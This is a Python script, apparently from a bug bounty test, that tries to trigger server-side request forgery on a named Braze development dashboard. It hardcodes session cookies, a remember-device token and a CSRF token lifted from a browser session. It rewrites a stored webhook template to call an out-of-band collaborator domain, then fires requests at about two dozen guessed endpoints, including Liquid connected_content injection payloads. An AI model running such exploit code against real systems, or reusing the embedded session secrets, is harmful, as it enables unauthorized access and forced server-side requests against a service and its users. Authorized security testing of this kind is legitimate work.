#!/usr/bin/env python3
"""
SSRF Trigger Script v2 — Fresh session credentials
Uses the updated cookies/CSRF from the user's active browser session.
Focus: trigger the stored webhook templates to fire server-side requests.
"""

import requests
import json
import time
import re
import subprocess
import os
import threading
from datetime import datetime, timezone

TARGET_HOST = "https://bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com"
APP_GROUP_ID = "69c8d257629242005dba8746"

COOKIE_HEADER = (
    "i18next=en; "
    "sign_in_email=venu17%2B3ytlztjh%40wearehackerone.com; "
    "remember_login_enc_v1=%242%24%2BNEHL07HulteW1IZd8msag%3D%3D%24bmogoUhLR3JXAHPzqTXq%2FLVSBvwxkLmE8HzxeObbktbaT4A0AeovHWx2fHq1%0AxHIp; "
    "_session_id=8395a904b64f05784979cdef1bc47352; "
    "ag_id___69c8d257629242005dba86a5=69c8d257629242005dba8746; "
    "f_ag_id___69c8d257629242005dba86a5=69c8d257629242005dba8746; "
    "authy_remember_device=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdDRG9RY21WdFpXMWlaWEpmYldWR09neGxlSEJwY21WelZUb2dRV04wYVhabFUzVndjRzl5ZERvNlZHbHRaVjlwZEdoYWIyNWxXd2hKZFRvSlZHbHRaUTJJangvQVUydVdWZ2s2RFc1aGJtOWZiblZ0YVFKZkFUb05ibUZ1YjE5a1pXNXBCam9OYzNWaWJXbGpjbThpQnpVUU9nbDZiMjVsU1NJSVZWUkRCam9HUlVaSklnaFZWRU1HT3cxVVNYVTdDQTJJangvQVUydVdWZ2s3Q1drQ1h3RTdDbWtHT3dzaUJ6VVFPd3hBQ1RvUlpHVjJaV3h2Y0dWeVgybGtTU0lkTmpsak9HUXlOVGcyTWpreU5ESXdNRFZrWW1FNE9EVXdCanNOVkE9PSIsImV4cCI6IjIwMjYtMDQtMjhUMDg6MjE6NDEuNDIwWiIsInB1ciI6bnVsbH19--8eada447233c614c77d2e44632ec5f5e5e7ee109; "
    "ab.storage.userId.9468396f-efb5-4a0d-be8b-f26b50d82ef9=g%3A69c8d258629242005dba8850%7Ce%3Aundefined%7Cc%3A1774772546872%7Cl%3A1774772546879; "
    "ab.storage.deviceId.9468396f-efb5-4a0d-be8b-f26b50d82ef9=g%3A35fa50d8-042f-48e3-a9fe-cf8c42b1af8d%7Ce%3Aundefined%7Cc%3A1774772546883%7Cl%3A1774772546883; "
    "ab.storage.sessionId.9468396f-efb5-4a0d-be8b-f26b50d82ef9=g%3A0a14ddb8-7429-4dad-a22f-6522708e0b8d%7Ce%3A1774772979908%7Cc%3A1774772546876%7Cl%3A1774772679908; "
    "_dd_s=logs=1&id=f9605267-cc3a-43bd-beef-a95c51f10e74&created=1774772507970&expire=1774773616898&rum=2"
)

CSRF_TOKEN = "_P6eaH7rirGYAp7Te6Y_fzN6HWkEjSpUe6m5lxjVWrDEwdomSTYiDMa8VWOy5njbFKFclp1fV7EF-ykKbj1OYw"

KNOWN_TEMPLATE_ID = "69c8e1c02b6ccb005d77754f"
KNOWN_API_IDENTIFIER = "ee880344-cf11-4c54-b022-7fc0f9689e03"
BURP_COLLAB = "ioaotfq5cntio10oir563kvkdbj27svh.oastify.com"

interactions_detected = []


def log(msg):
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


def make_curl_request(method, path, body=None, extra_headers=None):
    """Use curl directly to avoid Python requests cookie encoding issues."""
    url = f"{TARGET_HOST}{path}"
    cmd = [
        "curl", "-s", "-w", "\n---HTTP_CODE:%{http_code}---TIME:%{time_total}---",
        "-X", method,
        "-H", f"Cookie: {COOKIE_HEADER}",
        "-H", f"X-Csrf-Token: {CSRF_TOKEN}",
        "-H", "Content-Type: application/json",
        "-H", "Accept: application/json",
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", f"Origin: {TARGET_HOST}",
        "-H", "Sec-Fetch-Site: same-origin",
        "-H", "Sec-Fetch-Mode: cors",
        "-H", "Sec-Fetch-Dest: empty",
        "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "--max-time", "15",
        "-L",
    ]

    if extra_headers:
        for k, v in extra_headers.items():
            cmd.extend(["-H", f"{k}: {v}"])

    if body:
        cmd.extend(["-d", json.dumps(body) if isinstance(body, dict) else body])

    cmd.append(url)

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        output = result.stdout
        code_match = re.search(r"---HTTP_CODE:(\d+)---TIME:([\d.]+)---", output)
        if code_match:
            http_code = int(code_match.group(1))
            elapsed = float(code_match.group(2))
            body_text = output[:output.rfind("---HTTP_CODE:")]
            return {"status_code": http_code, "body": body_text, "elapsed": elapsed}
        return {"status_code": 0, "body": output[:500], "elapsed": 0}
    except Exception as e:
        return {"error": str(e)}


def start_interactsh():
    gopath = subprocess.check_output(["go", "env", "GOPATH"]).decode().strip()
    client_bin = os.path.join(gopath, "bin", "interactsh-client")
    proc = subprocess.Popen(
        [client_bin, "-v", "-poll-interval", "3", "-json"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    domain = None
    deadline = time.time() + 15
    while time.time() < deadline:
        line = proc.stderr.readline()
        if not line:
            time.sleep(0.2)
            continue
        match = re.search(r"([a-z0-9]+\.oast\.\w+)", line)
        if match:
            domain = match.group(1)
            break
    return proc, domain


def collect_interactions(proc, duration=90):
    global interactions_detected
    deadline = time.time() + duration
    while time.time() < deadline:
        line = proc.stdout.readline()
        if line.strip():
            try:
                data = json.loads(line.strip())
                interactions_detected.append(data)
                proto = data.get("protocol", "unknown")
                full_id = data.get("full-id", "")
                src = data.get("remote-address", "")
                log(f"  *** OOB [{proto}] from {src}: {full_id[:80]}")
            except json.JSONDecodeError:
                if any(k in line.lower() for k in ["oast", "dns", "http", "interact"]):
                    interactions_detected.append({"raw": line.strip()})
                    log(f"  *** OOB (raw): {line.strip()[:200]}")
        time.sleep(0.3)


def main():
    log("=" * 70)
    log("SSRF Trigger v2 — Fresh Session Credentials")
    log("=" * 70)

    # Start interactsh
    log("\nStarting interactsh for OOB detection...")
    interactsh_proc, oob_domain = start_interactsh()
    log(f"Interactsh domain: {oob_domain}")

    collector = threading.Thread(target=collect_interactions, args=(interactsh_proc, 180))
    collector.daemon = True
    collector.start()

    # Verify session is valid
    log("\n--- Verifying session ---")
    resp = make_curl_request("GET", f"/engagement/webhook_templates?app_group_id={APP_GROUP_ID}")
    log(f"Template list: {resp.get('status_code')} — {resp.get('body', '')[:150]}")

    # Step 1: Update the known template with our OOB + interactsh URLs
    log("\n--- Step 1: Update template with OOB URLs ---")

    oob_url = f"https://webhook-fire.{oob_domain}" if oob_domain else f"https://{BURP_COLLAB}"
    update_payload = {
        "id": KNOWN_TEMPLATE_ID,
        "name": "test ssrf trigger",
        "description": None,
        "tag_names": [],
        "webhook_body": "{}",
        "webhook_body_type": "json",
        "webhook_method": "POST",
        "territory_ids": [],
        "api_identifier": KNOWN_API_IDENTIFIER,
        "webhook_url": oob_url,
        "webhook_headers": {},
    }
    resp = make_curl_request(
        "POST",
        f"/engagement/webhook_templates/{KNOWN_TEMPLATE_ID}?app_group_id={APP_GROUP_ID}",
        body=update_payload,
        extra_headers={"Referer": f"{TARGET_HOST}/engagement/templates_and_media/webhook_templates/{APP_GROUP_ID}/{KNOWN_TEMPLATE_ID}"},
    )
    log(f"Update template: {resp.get('status_code')} — {resp.get('body', '')[:200]}")

    # Step 2: Try every conceivable trigger endpoint with fresh CSRF
    log("\n--- Step 2: Comprehensive trigger attempts ---")

    # Get fresh CSRF from a page load
    log("Fetching fresh CSRF from page...")
    page_resp = make_curl_request(
        "GET",
        f"/engagement/templates_and_media/webhook_templates/{APP_GROUP_ID}/{KNOWN_TEMPLATE_ID}",
    )
    csrf_match = re.search(r'name="csrf-token"\s+content="([^"]+)"', page_resp.get("body", ""))
    fresh_csrf = csrf_match.group(1) if csrf_match else CSRF_TOKEN
    log(f"Fresh CSRF: {fresh_csrf[:30]}...")

    trigger_endpoints = [
        # Template-level triggers with real template ID
        ("POST", f"/engagement/webhook_templates/{KNOWN_TEMPLATE_ID}/test?app_group_id={APP_GROUP_ID}", {}),
        ("POST", f"/engagement/webhook_templates/{KNOWN_TEMPLATE_ID}/test_send?app_group_id={APP_GROUP_ID}", {}),
        ("POST", f"/engagement/webhook_templates/{KNOWN_TEMPLATE_ID}/send_test?app_group_id={APP_GROUP_ID}", {}),
        ("POST", f"/engagement/webhook_templates/{KNOWN_TEMPLATE_ID}/test?app_group_id={APP_GROUP_ID}", {"template_id": KNOWN_TEMPLATE_ID}),
        ("GET", f"/engagement/webhook_templates/{KNOWN_TEMPLATE_ID}/test?app_group_id={APP_GROUP_ID}", None),
        ("GET", f"/engagement/webhook_templates/{KNOWN_TEMPLATE_ID}/preview?app_group_id={APP_GROUP_ID}", None),

        # Direct webhook test with inline config
        ("POST", f"/engagement/webhook/test_send?app_group_id={APP_GROUP_ID}", {
            "webhook_url": oob_url,
            "webhook_method": "GET",
            "webhook_body": "",
            "webhook_headers": {},
        }),
        ("POST", f"/engagement/webhooks/test_send?app_group_id={APP_GROUP_ID}", {
            "webhook_url": oob_url,
            "webhook_method": "GET",
            "webhook_body": "",
            "webhook_headers": {},
        }),
        ("POST", f"/engagement/webhook_campaigns/test_send?app_group_id={APP_GROUP_ID}", {
            "webhook_url": oob_url,
            "webhook_method": "GET",
            "webhook_body": "",
            "webhook_headers": {},
        }),

        # Try with api_identifier
        ("POST", f"/engagement/webhook/test_send?app_group_id={APP_GROUP_ID}", {
            "api_identifier": KNOWN_API_IDENTIFIER,
        }),
        ("POST", f"/engagement/webhooks/test?app_group_id={APP_GROUP_ID}", {
            "api_identifier": KNOWN_API_IDENTIFIER,
        }),

        # Campaign test send endpoints
        ("POST", f"/engagement/campaigns/test_send?app_group_id={APP_GROUP_ID}", {
            "webhook_url": oob_url,
            "webhook_method": "GET",
            "webhook_body": "",
            "webhook_headers": {},
        }),

        # Try the messaging endpoints
        ("POST", f"/messaging/webhook/send?app_group_id={APP_GROUP_ID}", {
            "webhook_url": oob_url,
        }),
        ("POST", f"/api/v1/messages/send?app_group_id={APP_GROUP_ID}", {
            "webhook_url": oob_url,
        }),

        # Template test with full webhook config inline
        ("POST", f"/engagement/webhook_templates/test?app_group_id={APP_GROUP_ID}", {
            "id": KNOWN_TEMPLATE_ID,
            "webhook_url": oob_url,
            "webhook_method": "GET",
            "webhook_body": "",
            "webhook_headers": {},
        }),

        # Try with user_ids for test send
        ("POST", f"/engagement/webhook/test_send?app_group_id={APP_GROUP_ID}", {
            "webhook_url": oob_url,
            "webhook_method": "GET",
            "webhook_body": "",
            "webhook_headers": {},
            "user_ids": ["69c8d258629242005dba8850"],
        }),
        ("POST", f"/engagement/webhooks/test_send?app_group_id={APP_GROUP_ID}", {
            "webhook_url": oob_url,
            "webhook_method": "GET",
            "webhook_body": "",
            "webhook_headers": {},
            "user_ids": ["69c8d258629242005dba8850"],
        }),

        # Try creating a minimal campaign and triggering
        ("POST", f"/engagement/campaigns?app_group_id={APP_GROUP_ID}", {
            "name": f"ssrf-campaign-{int(time.time())}",
            "messages": {"webhook": {
                "webhook_url": oob_url,
                "webhook_method": "GET",
                "webhook_body": "",
                "webhook_headers": {},
            }},
        }),

        # Connected Content test
        ("POST", f"/engagement/connected_content/test?app_group_id={APP_GROUP_ID}", {
            "url": oob_url,
        }),
        ("POST", f"/engagement/test_connected_content?app_group_id={APP_GROUP_ID}", {
            "url": oob_url,
        }),

        # Preview with liquid tag
        ("POST", f"/engagement/preview?app_group_id={APP_GROUP_ID}", {
            "body": f'{{% connected_content {oob_url} %}}',
        }),
        ("POST", f"/engagement/messages/preview?app_group_id={APP_GROUP_ID}", {
            "message": f'{{% connected_content {oob_url} %}}',
        }),
        ("POST", f"/engagement/liquid_preview?app_group_id={APP_GROUP_ID}", {
            "template": f'{{% connected_content {oob_url} %}}',
        }),

        # Content block preview (may render Connected Content)
        ("POST", f"/engagement/content_blocks/preview?app_group_id={APP_GROUP_ID}", {
            "content": f'{{% connected_content {oob_url} %}}',
        }),
    ]

    results = []
    for i, (method, endpoint, body) in enumerate(trigger_endpoints, 1):
        log(f"\n[{i}/{len(trigger_endpoints)}] {method} {endpoint}")
        if body is not None:
            resp = make_curl_request(method, endpoint, body=body,
                                     extra_headers={"X-Csrf-Token": fresh_csrf})
        else:
            resp = make_curl_request(method, endpoint,
                                     extra_headers={"X-Csrf-Token": fresh_csrf})

        status = resp.get("status_code", "ERR")
        body_preview = resp.get("body", resp.get("error", ""))[:150].replace("\n", " ")
        elapsed = resp.get("elapsed", 0)

        marker = ""
        if status not in (301, 302, 404):
            marker = " ***"
        if status == 200 and "error" not in body_preview.lower() and "redirect" not in body_preview.lower():
            marker = " *** INTERESTING"

        log(f"  -> {status} ({elapsed:.2f}s){marker} — {body_preview}")
        results.append({
            "method": method,
            "endpoint": endpoint,
            "status": status,
            "body": resp.get("body", "")[:500],
            "elapsed": elapsed,
        })
        time.sleep(0.5)

    # Step 3: Wait for OOB
    log("\n--- Step 3: Waiting for OOB interactions (60s) ---")
    time.sleep(60)

    # Step 4: Results
    log(f"\n{'=' * 70}")
    log(f"RESULTS: {len(interactions_detected)} OOB interaction(s) detected")
    log(f"{'=' * 70}")

    if interactions_detected:
        log("\n*** SSRF CONFIRMED ***\n")
        for i, interaction in enumerate(interactions_detected, 1):
            log(f"Interaction {i}:")
            log(json.dumps(interaction, indent=2)[:1500])
    else:
        log("\nNo OOB interactions detected.")
        log("The webhook templates are stored with malicious URLs but need UI/API triggering.")

    # Summarize interesting responses
    log("\n--- Interesting (non-redirect) responses ---")
    for r in results:
        if r["status"] not in (301, 302, 0):
            log(f"  {r['method']} {r['endpoint']}: {r['status']} — {r['body'][:120]}")

    # Save results
    with open("/workspace/ssrf_trigger_v2_results.json", "w") as f:
        json.dump({
            "oob_domain": oob_domain,
            "interactions": interactions_detected,
            "trigger_results": results,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }, f, indent=2)

    log(f"\nResults saved to /workspace/ssrf_trigger_v2_results.json")

    if interactsh_proc:
        interactsh_proc.terminate()


if __name__ == "__main__":
    main()
